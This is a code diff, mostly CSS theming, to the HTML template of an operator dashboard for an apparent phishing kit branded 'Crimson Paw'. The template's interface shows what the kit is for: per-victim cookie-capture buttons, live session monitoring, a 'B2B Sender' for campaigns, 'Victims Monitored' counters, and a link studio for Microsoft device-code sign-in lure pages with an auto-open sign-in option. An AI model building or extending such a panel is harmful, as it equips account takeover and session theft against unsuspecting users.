-        .ab-notif-item { padding: 11px 16px; border-bottom: 1px solid #201014; font-size: 12px; color: #f0ebed; line-height: 1.4; transition: background 0.12s; }
-        .ab-notif-item:hover { background: #1c0e13; }
-        .ab-notif-time { font-size: 10px; color: #a49498; margin-top: 4px; }
+        .ab-notif-dropdown { position: absolute; top: 48px; right: 0; width: 350px; max-width: 90vw; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; box-shadow: 0 10px 36px rgba(0,0,0,0.8); z-index: 1000; overflow: hidden; }
+        .ab-notif-hdr { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border-color); font-size: 13px; font-weight: 700; color: #ffffff; }
+        .ab-notif-clear { font-size: 11px; color: var(--accent-color); cursor: pointer; font-weight: 600; transition: all 0.15s; }
+        .ab-notif-clear:hover { color: #ffffff; text-decoration: underline; }
+        .ab-notif-list { max-height: 320px; overflow-y: auto; overflow-x: hidden; scrollbar-width: thin; scrollbar-color: var(--border-color) var(--bg-primary); }
+        .ab-notif-list::-webkit-scrollbar { width: 5px; }
+        .ab-notif-list::-webkit-scrollbar-track { background: var(--bg-primary); }
+        .ab-notif-list::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 3px; }
+        .ab-notif-list::-webkit-scrollbar-thumb:hover { background: var(--accent-color); }
+        .ab-notif-empty { padding: 20px; text-align: center; color: var(--text-secondary); font-size: 12px; }
+        .ab-notif-item { padding: 11px 16px; border-bottom: 1px solid var(--border-color); font-size: 12px; color: var(--text-primary); line-height: 1.4; transition: background 0.12s; }
+        .ab-notif-item:hover { background: var(--bg-panel); }
+        .ab-notif-time { font-size: 10px; color: var(--text-secondary); margin-top: 4px; }
         
         /* Metrics Bar (Single Wide Card) - 6 Columns */
-        .ab-stats-row { display: grid; grid-template-columns: repeat(6, 1fr); gap: 16px; margin-bottom: 24px; padding: 18px 24px; background: #0f080b; border: 1px solid #2e1216; border-radius: 12px; flex-shrink: 0; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
+        .ab-stats-row { display: grid; grid-template-columns: repeat(6, 1fr); gap: 16px; margin-bottom: 24px; padding: 18px 24px; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 12px; flex-shrink: 0; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
         @media (max-width: 1200px) { .ab-stats-row { grid-template-columns: repeat(3, 1fr); gap: 14px; } }
         @media (max-width: 768px) { .ab-stats-row { grid-template-columns: repeat(2, 1fr); gap: 12px; } }
         .ab-stat-box { display: flex; flex-direction: column; gap: 4px; min-width: 0; }
@@ -755,49 +889,49 @@ HTML_TEMPLATE = r'''
         .ab-stat-val { font-size: 24px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
         
         /* Table Card Container */
-        .ab-table-card { background: #0f080b; border: 1px solid #2e1216; border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 4px 24px rgba(0,0,0,0.4); }
-        .ab-table-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 22px; border-bottom: 1px solid #241115; flex-wrap: wrap; gap: 12px; }
+        .ab-table-card { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 4px 24px rgba(0,0,0,0.4); }
+        .ab-table-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 22px; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 12px; }
         .ab-table-title-group { display: flex; align-items: center; gap: 10px; font-size: 16px; font-weight: 800; color: #ffffff; }
-        .ab-lock-icon { color: #e50914; flex-shrink: 0; }
-        .ab-count-pill { background: #261115; border: 1px solid #5a1c22; color: #ff8b94; font-size: 11px; font-weight: 800; padding: 2px 9px; border-radius: 12px; }
+        .ab-lock-icon { color: var(--accent-color); flex-shrink: 0; }
+        .ab-count-pill { background: var(--badge-bg); border: 1px solid var(--badge-border); color: var(--badge-color); font-size: 11px; font-weight: 800; padding: 2px 9px; border-radius: 12px; }
         .ab-table-tools { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; position: relative; }
-        .ab-filter-btn { background: #161014; border: 1px solid #38161b; border-radius: 6px; color: #cbd5e1; font-size: 11px; font-weight: 700; padding: 6px 14px; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: all 0.15s; letter-spacing: 0.04em; outline: none; }
-        .ab-filter-btn:hover, .ab-filter-btn.active { background: #261115; border-color: #e50914; color: #ffffff; }
-        .ab-filter-popover { position: absolute; top: 38px; right: 200px; background: #140b0e; border: 1px solid #38161b; border-radius: 8px; padding: 12px 14px; box-shadow: 0 8px 24px rgba(0,0,0,0.7); z-index: 100; min-width: 170px; display: flex; flex-direction: column; gap: 8px; }
-        .ab-filter-popover-title { font-size: 11px; font-weight: 700; color: #ff6b72; text-transform: uppercase; margin-bottom: 4px; }
+        .ab-filter-btn { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 6px; color: #cbd5e1; font-size: 11px; font-weight: 700; padding: 6px 14px; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: all 0.15s; letter-spacing: 0.04em; outline: none; }
+        .ab-filter-btn:hover, .ab-filter-btn.active { background: var(--border-color); border-color: var(--accent-color); color: #ffffff; }
+        .ab-filter-popover { position: absolute; top: 38px; right: 200px; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; box-shadow: 0 8px 24px rgba(0,0,0,0.7); z-index: 100; min-width: 170px; display: flex; flex-direction: column; gap: 8px; }
+        .ab-filter-popover-title { font-size: 11px; font-weight: 700; color: var(--accent-color); text-transform: uppercase; margin-bottom: 4px; }
         .ab-filter-opt { display: flex; align-items: center; gap: 8px; font-size: 12px; color: #f0ebed; cursor: pointer; }
-        .ab-filter-opt input { accent-color: #e50914; cursor: pointer; }
-        .ab-search-box { display: flex; align-items: center; background: #161014; border: 1px solid #38161b; border-radius: 6px; padding: 2px 10px; gap: 8px; }
+        .ab-filter-opt input { accent-color: var(--accent-color); cursor: pointer; }
+        .ab-search-box { display: flex; align-items: center; background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 6px; padding: 2px 10px; gap: 8px; }
         .ab-search-label { font-size: 10px; font-weight: 700; color: #a49498; letter-spacing: 0.06em; }
         .ab-search-box input { background: transparent; border: none; outline: none; color: #ffffff; font-size: 12px; padding: 6px 0; width: 140px; font-family: inherit; }
         .ab-search-box input::placeholder { color: #6e5c61; }
         
         /* Table Sub-Bars (Top and Bottom Controls) */
-        .ab-table-subbar { display: flex; justify-content: space-between; align-items: center; padding: 10px 22px; background: #0a0608; border-bottom: 1px solid #201014; font-size: 12px; color: #a49498; flex-wrap: wrap; gap: 10px; }
-        .ab-table-subbar-bottom { border-bottom: none; border-top: 1px solid #201014; }
+        .ab-table-subbar { display: flex; justify-content: space-between; align-items: center; padding: 10px 22px; background: var(--bg-primary); border-bottom: 1px solid var(--border-color); font-size: 12px; color: #a49498; flex-wrap: wrap; gap: 10px; }
+        .ab-table-subbar-bottom { border-bottom: none; border-top: 1px solid var(--border-color); }
         .ab-subbar-left { display: flex; align-items: center; gap: 8px; }
         .ab-entries-label { font-size: 11px; font-weight: 700; color: #a49498; letter-spacing: 0.05em; }
-        .ab-entries-select { background: #161014; border: 1px solid #38161b; border-radius: 5px; color: #f0ebed; font-size: 12px; padding: 4px 8px; cursor: pointer; outline: none; }
-        .ab-select-pill-btn { background: #161014; border: 1px solid #38161b; border-radius: 5px; color: #cbd5e1; font-size: 11px; font-weight: 700; padding: 4px 10px; cursor: pointer; letter-spacing: 0.04em; transition: all 0.15s; outline: none; }
-        .ab-select-pill-btn:hover { border-color: #e50914; color: #ffffff; background: #261115; }
-        .ab-icon-circle-btn { width: 24px; height: 24px; border-radius: 50%; background: #161014; border: 1px solid #38161b; color: #a49498; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.15s; outline: none; }
-        .ab-icon-circle-btn:hover { border-color: #e50914; color: #ffffff; }
+        .ab-entries-select { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 5px; color: #f0ebed; font-size: 12px; padding: 4px 8px; cursor: pointer; outline: none; }
+        .ab-select-pill-btn { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 5px; color: #cbd5e1; font-size: 11px; font-weight: 700; padding: 4px 10px; cursor: pointer; letter-spacing: 0.04em; transition: all 0.15s; outline: none; }
+        .ab-select-pill-btn:hover { border-color: var(--accent-color); color: #ffffff; background: var(--border-color); }
+        .ab-icon-circle-btn { width: 24px; height: 24px; border-radius: 50%; background: var(--bg-panel); border: 1px solid var(--border-color); color: #a49498; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.15s; outline: none; }
+        .ab-icon-circle-btn:hover { border-color: var(--accent-color); color: #ffffff; }
         .ab-subbar-right { display: flex; align-items: center; gap: 14px; }
         .ab-page-info { font-size: 11.5px; color: #a49498; }
         .ab-page-nav { display: flex; align-items: center; gap: 4px; }
-        .ab-page-btn { background: #161014; border: 1px solid #38161b; border-radius: 4px; color: #cbd5e1; font-size: 11.5px; padding: 3px 9px; cursor: pointer; transition: all 0.12s; outline: none; }
-        .ab-page-btn:hover:not(:disabled) { border-color: #e50914; color: #ffffff; background: #261115; }
-        .ab-page-btn.active { background: #e50914; border-color: #e50914; color: #ffffff; font-weight: 700; }
+        .ab-page-btn { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 4px; color: #cbd5e1; font-size: 11.5px; padding: 3px 9px; cursor: pointer; transition: all 0.12s; outline: none; }
+        .ab-page-btn:hover:not(:disabled) { border-color: var(--accent-color); color: #ffffff; background: var(--border-color); }
+        .ab-page-btn.active { background: var(--accent-color); border-color: var(--accent-color); color: #ffffff; font-weight: 700; }
         .ab-page-btn:disabled { opacity: 0.4; cursor: not-allowed; }
         
         /* Table Scroll and Elements */
         .ab-table-scroll { overflow-x: auto; width: 100%; }
         .ab-table { width: 100%; border-collapse: collapse; text-align: left; }
-        .ab-table th { padding: 12px 14px; font-size: 11px; font-weight: 700; color: #a49498; letter-spacing: 0.06em; text-transform: uppercase; border-bottom: 1px solid #241115; background: #0a0608; white-space: nowrap; user-select: none; }
+        .ab-table th { padding: 12px 14px; font-size: 11px; font-weight: 700; color: #a49498; letter-spacing: 0.06em; text-transform: uppercase; border-bottom: 1px solid var(--border-color); background: var(--bg-primary); white-space: nowrap; user-select: none; }
         .ab-table th.sortable { cursor: pointer; transition: color 0.15s; }
         .ab-table th.sortable:hover { color: #ffffff; }
         .ab-sort-icon { display: inline-block; font-size: 10px; margin-left: 4px; opacity: 0.6; }
-        .ab-table td { padding: 12px 14px; font-size: 12.5px; color: #f0ebed; border-bottom: 1px solid #201014; vertical-align: middle; }
+        .ab-table td { padding: 12px 14px; font-size: 12.5px; color: #f0ebed; border-bottom: 1px solid var(--border-color); vertical-align: middle; }
         .ab-table tbody tr:hover td { background: #160e12; }
         .ab-name-cell { font-weight: 700; color: #ffffff; white-space: nowrap; }
         .ab-email-cell { color: #e2e8f0; font-family: monospace; font-size: 12px; white-space: nowrap; }
@@ -813,37 +947,37 @@ HTML_TEMPLATE = r'''
         
         /* Row Actions */
         .ab-action-group { display: flex; align-items: center; justify-content: center; gap: 6px; }
-        .ab-action-cookie-btn { background: #201115; border: 1px solid #5a1c22; color: #ff8b94; border-radius: 14px; font-size: 10px; font-weight: 800; padding: 4px 10px; cursor: pointer; letter-spacing: 0.05em; transition: all 0.15s; outline: none; }
-        .ab-action-cookie-btn:hover { background: #e50914; border-color: #e50914; color: #ffffff; box-shadow: 0 0 10px rgba(229, 9, 20, 0.5); transform: translateY(-1px); }
-        .ab-action-cookie-btn.ab-cookie-pending { background: #160f12 !important; border-color: #381a1f !important; color: #8e7479 !important; cursor: not-allowed !important; opacity: 0.65; box-shadow: none !important; transform: none !important; }
-        .ab-action-circle-btn { width: 28px; height: 28px; border-radius: 50%; background: #161014; border: 1px solid #38161b; color: #cbd5e1; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.15s; outline: none; }
-        .ab-action-circle-btn:hover { background: #261115; border-color: #e50914; color: #ffffff; transform: translateY(-1px); }
-        .ab-action-delete-btn:hover { background: #450a0a; border-color: #e50914; color: #f85149; }
+        .ab-action-cookie-btn { background: var(--badge-bg); border: 1px solid var(--badge-border); color: var(--accent-color); border-radius: 14px; font-size: 10px; font-weight: 800; padding: 4px 10px; cursor: pointer; letter-spacing: 0.05em; transition: all 0.15s; outline: none; }
+        .ab-action-cookie-btn:hover { background: var(--accent-color); border-color: var(--accent-hover); color: #ffffff; box-shadow: 0 0 10px var(--accent-glow); transform: translateY(-1px); }
+        .ab-action-cookie-btn.ab-cookie-pending { background: var(--bg-panel) !important; border-color: var(--border-color) !important; color: var(--text-secondary) !important; cursor: not-allowed !important; opacity: 0.65; box-shadow: none !important; transform: none !important; }
+        .ab-action-circle-btn { width: 28px; height: 28px; border-radius: 50%; background: var(--bg-panel); border: 1px solid var(--border-color); color: #cbd5e1; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.15s; outline: none; }
+        .ab-action-circle-btn:hover { background: var(--border-color); border-color: var(--accent-color); color: #ffffff; transform: translateY(-1px); }
+        .ab-action-delete-btn:hover { background: var(--badge-bg); border-color: var(--badge-border); color: var(--accent-color); }
 
         /* ── Keyword Alerts Page Styles ────────────────────────────────────────── */
-        .kwa-container { display: flex; flex-direction: column; height: 100%; width: 100%; background: #0a0709; color: #f0ebed; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        .kwa-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: #130c11; border-bottom: 1px solid #2e1216; flex-shrink: 0; flex-wrap: wrap; gap: 14px; }
-        .kwa-stats-strip { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; padding: 14px 24px; background: #0e080c; border-bottom: 1px solid #261014; flex-shrink: 0; }
-        .kwa-stat-card { background: #160e13; border: 1px solid #2e1216; border-radius: 8px; padding: 12px 18px; display: flex; flex-direction: column; gap: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+        .kwa-container { display: flex; flex-direction: column; height: 100%; width: 100%; background: var(--bg-primary); color: #f0ebed; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .kwa-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: var(--bg-sidebar); border-bottom: 1px solid var(--border-color); flex-shrink: 0; flex-wrap: wrap; gap: 14px; }
+        .kwa-stats-strip { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; padding: 14px 24px; background: var(--bg-primary); border-bottom: 1px solid var(--border-color); flex-shrink: 0; }
+        .kwa-stat-card { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 18px; display: flex; flex-direction: column; gap: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
         .kwa-stat-val { font-size: 1.6rem; font-weight: 800; color: #ffffff; }
-        .kwa-stat-lbl { font-size: 11px; text-transform: uppercase; color: #a49498; font-weight: 700; letter-spacing: 0.05em; }
+        .kwa-stat-lbl { font-size: 11px; text-transform: uppercase; color: var(--text-secondary); font-weight: 700; letter-spacing: 0.05em; }
         .kwa-split-wrap { display: flex; flex: 1; min-height: 0; overflow: hidden; }
-        .kwa-rules-panel { width: 380px; min-width: 320px; background: #10090d; border-right: 1px solid #281014; display: flex; flex-direction: column; overflow: hidden; flex-shrink: 0; }
-        .kwa-rules-header { padding: 12px 18px; border-bottom: 1px solid #240e13; display: flex; justify-content: space-between; align-items: center; background: #150c12; flex-shrink: 0; }
+        .kwa-rules-panel { width: 380px; min-width: 320px; background: var(--bg-sidebar); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; overflow: hidden; flex-shrink: 0; }
+        .kwa-rules-header { padding: 12px 18px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; background: var(--bg-panel); flex-shrink: 0; }
         .kwa-rules-list { flex: 1; overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 10px; }
-        .kwa-rule-card { background: #160e13; border: 1px solid #2e1216; border-radius: 8px; padding: 14px; transition: all 0.15s; }
-        .kwa-rule-card:hover { border-color: #e50914; box-shadow: 0 0 12px rgba(229,9,20,0.15); }
+        .kwa-rule-card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px; transition: all 0.15s; }
+        .kwa-rule-card:hover { border-color: var(--accent-color); box-shadow: 0 0 12px var(--accent-glow); }
         .kwa-rule-card.inactive { opacity: 0.55; }
         .kwa-badge { display: inline-flex; align-items: center; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.05em; }
-        .kwa-badge-critical { background: rgba(229,9,20,0.15); color: #f85149; border: 1px solid rgba(229,9,20,0.45); }
+        .kwa-badge-critical { background: var(--badge-bg); color: var(--badge-color); border: 1px solid var(--badge-border); }
         .kwa-badge-high { background: rgba(255,120,31,0.15); color: #ff9f43; border: 1px solid rgba(255,120,31,0.45); }
         .kwa-badge-medium { background: rgba(229,184,9,0.15); color: #ffd32a; border: 1px solid rgba(229,184,9,0.45); }
         .kwa-badge-info { background: rgba(9,132,229,0.15); color: #54a0ff; border: 1px solid rgba(9,132,229,0.45); }
-        .kwa-feed-panel { flex: 1; background: #0a0608; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }
-        .kwa-feed-toolbar { padding: 12px 20px; background: #120b10; border-bottom: 1px solid #261014; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; flex-shrink: 0; }
+        .kwa-feed-panel { flex: 1; background: var(--bg-primary); display: flex; flex-direction: column; overflow: hidden; min-width: 0; }
+        .kwa-feed-toolbar { padding: 12px 20px; background: var(--bg-sidebar); border-bottom: 1px solid var(--border-color); display: flex; align-items: center; gap: 12px; flex-wrap: wrap; flex-shrink: 0; }
         .kwa-feed-list { flex: 1; overflow-y: auto; padding: 16px 24px; display: flex; flex-direction: column; gap: 12px; }
-        .kwa-match-card { background: #140d12; border: 1px solid #281014; border-radius: 8px; padding: 16px; transition: all 0.15s; display: flex; flex-direction: column; gap: 10px; }
-        .kwa-match-card:hover { border-color: #4a1c22; background: #190f15; }
+        .kwa-match-card { background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; transition: all 0.15s; display: flex; flex-direction: column; gap: 10px; }
+        .kwa-match-card:hover { border-color: var(--accent-color); background: var(--bg-panel); }
         .kwa-match-card.triaged { opacity: 0.6; }
         .kwa-kw-chip { background: rgba(252,211,77,0.15); color: #fcd34d; font-weight: 800; font-family: monospace; font-size: 12px; padding: 3px 10px; border-radius: 6px; border: 1px solid rgba(252,211,77,0.3); display: inline-flex; align-items: center; gap: 6px; }
 
@@ -855,6 +989,7 @@ HTML_TEMPLATE = r'''
         body.role-operator #nav-b2b,
         body.role-operator #nav-sessions,
         body.role-operator #nav-operators,
+        body.role-operator #nav-audit,
         body.role-operator #nav-settings,
         body.role-operator #page-dashboard,
         body.role-operator #page-templates,
@@ -863,6 +998,7 @@ HTML_TEMPLATE = r'''
         body.role-operator #page-b2b,
         body.role-operator #page-sessions,
         body.role-operator #page-operators,
+        body.role-operator #page-audit,
         body.role-operator #page-settings {
             display: none !important;
         }
@@ -882,11 +1018,11 @@ HTML_TEMPLATE = r'''
 <body class="{{ 'role-operator' if user_role == 'operator' else 'role-admin' }}">
     <div class="sidebar" id="sidebar">
         <button type="button" class="toggle-btn" id="sidebar-toggle-btn" onclick="toggleSidebar()" title="Collapse sidebar">❮</button>
-        <div class="sidebar-header" {% if user_role != 'operator' %}onclick="handleBrandLogoClick()"{% endif %} style="display:flex; align-items:center; gap:10px; cursor:{{ 'default' if user_role == 'operator' else 'pointer' }};" title="Crimson Paw">
-            <img src="/static/img/crimson_paw_logo.png" style="width:28px; height:28px; border-radius:6px; border:1px solid rgba(229,9,20,0.4); box-shadow:0 0 8px rgba(229,9,20,0.5);">
+        <div class="sidebar-header" {% if user_role != 'operator' %}onclick="handleBrandLogoClick()"{% endif %} style="display:flex; align-items:center; gap:10px; cursor:{{ 'default' if user_role == 'operator' else 'pointer' }};" title="{{ platform_name or 'Crimson Paw' }}">
+            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" style="width:28px; height:28px; border-radius:6px; border:1px solid var(--accent-glow); box-shadow:0 0 8px var(--accent-glow); object-fit:contain;">
             <div style="display:flex; flex-direction:column; overflow:hidden;">
-                <span style="font-weight:900; letter-spacing:0.12em; color:#ffffff;">CRIMSON PAW</span>
-                <span id="sidebar-role-badge" style="font-size:9.5px; color:{{ '#58a6ff' if user_role == 'operator' else '#a49498' }}; font-weight:700; letter-spacing:0.06em;">{{ 'OPERATOR' if user_role == 'operator' else 'ADMIN' }}</span>
+                <span style="font-weight:900; letter-spacing:0.12em; color:#ffffff;">{{ platform_name or 'CRIMSON PAW' }}</span>
+                <span id="sidebar-role-badge" style="font-size:9.5px; color:{{ '#58a6ff' if user_role == 'operator' else ('var(--accent-color)' if is_master_admin else '#a49498') }}; font-weight:700; letter-spacing:0.06em;">{{ 'OPERATOR' if user_role == 'operator' else ('MASTER HOST' if is_master_admin else 'ADMIN') }}</span>
             </div>
         </div>
         <div class="nav-item {{ 'active' if user_role != 'operator' else '' }}" id="nav-dashboard" onclick="showPage('dashboard', this)"><span class="nav-icon">📊</span><span class="nav-text">Dashboard</span></div>
@@ -897,8 +1033,9 @@ HTML_TEMPLATE = r'''
         <div class="nav-item" id="nav-b2b" onclick="showPage('b2b', this)"><span class="nav-icon">✉️</span><span class="nav-text">B2B Sender</span></div>
         <div class="nav-item" id="nav-sessions" onclick="showPage('sessions', this)"><span class="nav-icon">📡</span><span class="nav-text">Live Sessions</span></div>
         <div class="nav-item" id="nav-operators" onclick="showPage('operators', this)"><span class="nav-icon">👥</span><span class="nav-text">Operators</span><span id="nav-badge-operators" style="display:none; font-size:10px; background:#58a6ff; color:#000; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
+        <div class="nav-item" id="nav-audit" onclick="showPage('audit', this)"><span class="nav-icon">📋</span><span class="nav-text">Audit Trail</span><span id="nav-badge-audit" style="display:none; font-size:10px; background:var(--accent-color); color:#fff; font-weight:800; padding:1px 6px; border-radius:10px; margin-left:auto;">0</span></div>
         <div class="nav-item" id="nav-settings" onclick="showPage('settings', this)"><span class="nav-icon">⚙️</span><span class="nav-text">Settings</span></div>
-        <div class="nav-item" id="nav-logout" onclick="handleLogout()" style="margin-top:auto; color:#ff6b72; border-top:1px solid #261115;"><span class="nav-icon">🚪</span><span class="nav-text">Logout</span></div>
+        <div class="nav-item" id="nav-logout" onclick="handleLogout()" style="margin-top:auto; color:var(--accent-color); border-top:1px solid var(--border-color);"><span class="nav-icon">🚪</span><span class="nav-text">Logout</span></div>
     </div>
 
     <div class="main-content">
@@ -1171,7 +1308,7 @@ HTML_TEMPLATE = r'''
                                         <label class="lg-label">PAGE BACKGROUND BLUR</label>
                                         <span id="lg-blur-val" style="font-size:11px; color:#ff6b72; font-family:monospace;">8%</span>
                                     </div>
-                                    <input type="range" id="lg-blur-slider" min="0" max="100" value="8" style="accent-color:#e50914; width:100%; cursor:pointer;" oninput="document.getElementById('lg-blur-val').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onFieldChange();">
+                                    <input type="range" id="lg-blur-slider" min="0" max="100" value="8" style="accent-color:var(--accent-color); width:100%; cursor:pointer;" oninput="document.getElementById('lg-blur-val').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onFieldChange();">
                                     <span style="font-size:10px; color:#a49498;">0 - sharp : 100 - extremely blurred (image only)</span>
                                 </div>
 
@@ -1449,8 +1586,8 @@ HTML_TEMPLATE = r'''
                                         <div class="lg-form-group">
                                             <label class="lg-label">LEFT PANEL 3D DESIGN</label>
                                             <div class="lg-row-inline">
-                                                <button type="button" class="lg-default-btn" style="background:#261115;border:1px solid #5a1c22;padding:5px 12px;border-radius:5px;color:#f0ebed;font-weight:700;" onclick="showToast('Random 3D design assigned')">RANDOM DESIGN</button>
-                                                <span style="font-size:0.72rem;color:#ff8b94;font-weight:600;">USE DEFAULT #1/60</span>
+                                                <button type="button" class="lg-default-btn" style="background:var(--bg-panel);border:1px solid var(--border-color);padding:5px 12px;border-radius:5px;color:var(--text-primary);font-weight:700;" onclick="showToast('Random 3D design assigned')">RANDOM DESIGN</button>
+                                                <span style="font-size:0.72rem;color:var(--accent-color);font-weight:600;">USE DEFAULT #1/60</span>
                                             </div>
                                         </div>
                                     </div>
@@ -1564,7 +1701,7 @@ HTML_TEMPLATE = r'''
 
                                     <!-- Mode A: Activity Alert -->
                                     <div id="mode-section-A" style="display:none; flex-direction:column; gap:10px;">
-                                        <div class="lg-subheading" style="color:#ff6b72; font-weight:800;">ACTIVITY CARD</div>
+                                        <div class="lg-subheading" style="color:var(--accent-color); font-weight:800;">ACTIVITY CARD</div>
                                         <div class="lg-form-group">
                                             <div style="display:flex;justify-content:space-between;align-items:center;">
                                                 <label class="lg-label">EYEBROW</label>
@@ -1765,7 +1902,7 @@ HTML_TEMPLATE = r'''
                                             <label class="lg-label">PAGE BACKGROUND BLUR</label>
                                             <span id="lg-land-blur-num" style="color:#ff6b72; font-size:0.75rem; font-weight:700;">8%</span>
                                         </div>
-                                        <input type="range" id="lg-land-blur" min="0" max="100" value="8" style="accent-color:#e50914; width:100%;" oninput="document.getElementById('lg-land-blur-num').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onLandingFieldChange();">
+                                        <input type="range" id="lg-land-blur" min="0" max="100" value="8" style="accent-color:var(--accent-color); width:100%;" oninput="document.getElementById('lg-land-blur-num').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onLandingFieldChange();">
                                         <span class="lg-hint-text">0 = sharp · 100 = extremely blurred (image only)</span>
                                     </div>
                                     <div class="lg-form-group">
@@ -1786,7 +1923,7 @@ HTML_TEMPLATE = r'''
                                 <div class="lg-editor-box">
                                     <div class="lg-box-title"><span>COPY & SIGN-IN BUTTONS</span></div>
                                     <div style="display:flex; align-items:flex-start; gap:9px; margin-bottom:4px;">
-                                        <input type="checkbox" id="lg-land-auto-open" style="accent-color:#e50914; margin-top:2px;" onchange="onLandingFieldChange()">
+                                        <input type="checkbox" id="lg-land-auto-open" style="accent-color:var(--accent-color); margin-top:2px;" onchange="onLandingFieldChange()">
                                         <div>
                                             <strong style="font-size:0.76rem; color:#f0ebed;">Auto-open Sign-in</strong>
                                             <p class="lg-hint-text">After visitors copy the device code, automatically open the Microsoft sign-in popup. Off by default.</p>
@@ -1933,7 +2070,7 @@ HTML_TEMPLATE = r'''
                                             <label class="lg-label">PAGE BACKGROUND BLUR</label>
                                             <span id="lg-succ-blur-num" style="color:#ff6b72; font-size:0.75rem; font-weight:700;">8%</span>
                                         </div>
-                                        <input type="range" id="lg-succ-blur" min="0" max="100" value="8" style="accent-color:#e50914; width:100%;" oninput="document.getElementById('lg-succ-blur-num').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onSuccessFieldChange();">
+                                        <input type="range" id="lg-succ-blur" min="0" max="100" value="8" style="accent-color:var(--accent-color); width:100%;" oninput="document.getElementById('lg-succ-blur-num').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onSuccessFieldChange();">
                                         <span class="lg-hint-text">0 = sharp · 100 = extremely blurred (image only)</span>
                                     </div>
                                     <div class="lg-form-group">
@@ -1985,10 +2122,10 @@ HTML_TEMPLATE = r'''
                         <!-- TRANSLATION LANGUAGES & DEPLOY -->
                         <div style="display:flex; justify-content:space-between; align-items:center; margin-top:8px; gap:8px;">
                             <div style="display:flex; gap:8px;">
-                                <button type="button" class="lg-default-btn" style="background:#261115; border-color:#5a1c22; color:#f0ebed; padding:8px 14px;">
+                                <button type="button" class="lg-default-btn" style="background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-primary); padding:8px 14px;">
                                     🌐 LANGUAGE (1)
                                 </button>
-                                <button type="button" class="lg-default-btn" onclick="if(confirm('Reset all Link Studio fields and drafts to clean defaults?')) resetAllEditorsToDefault();" style="background:#1b1215; border-color:#4a1f26; color:#a49498; padding:8px 12px; font-size:11px; cursor:pointer;" title="Reset entire studio and draft to template defaults">
+                                <button type="button" class="lg-default-btn" onclick="handleResetLinkStudio()" style="background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-secondary); padding:8px 12px; font-size:11px; cursor:pointer;" title="Reset entire studio and draft to template defaults">
                                     🔄 Reset All
                                 </button>
                             </div>
@@ -2030,7 +2167,7 @@ HTML_TEMPLATE = r'''
                         <div>
                             <button type="button" class="lg-icon-btn" title="Export Links" onclick="copyAllLinks()">🔗</button>
                             <button type="button" class="lg-icon-btn" title="Kill Selected Links (Return 404)" style="color:#f87171; border-color:#ef4444;" onclick="killSelectedDeployments()">⚡</button>
-                            <button type="button" class="lg-icon-btn" title="Delete Selected" style="color:#ff3b45; border-color:#e50914;" onclick="deleteSelectedDeployments()">🗑️</button>
+                            <button type="button" class="lg-icon-btn" title="Delete Selected" style="color:var(--accent-color); border-color:var(--border-color);" onclick="deleteSelectedDeployments()">🗑️</button>
                             <button type="button" class="lg-icon-btn" title="B2B Campaign" onclick="showPage('b2b')">✉️</button>
                         </div>
                     </div>
@@ -2278,11 +2415,11 @@ HTML_TEMPLATE = r'''
                         <div class="kwa-stat-lbl">Victims Monitored</div>
                     </div>
                     <div class="kwa-stat-card">
-                        <div class="kwa-stat-val" id="kwa-stat-hits" style="color:#e50914;">0</div>
+                        <div class="kwa-stat-val" id="kwa-stat-hits" style="color:var(--accent-color);">0</div>
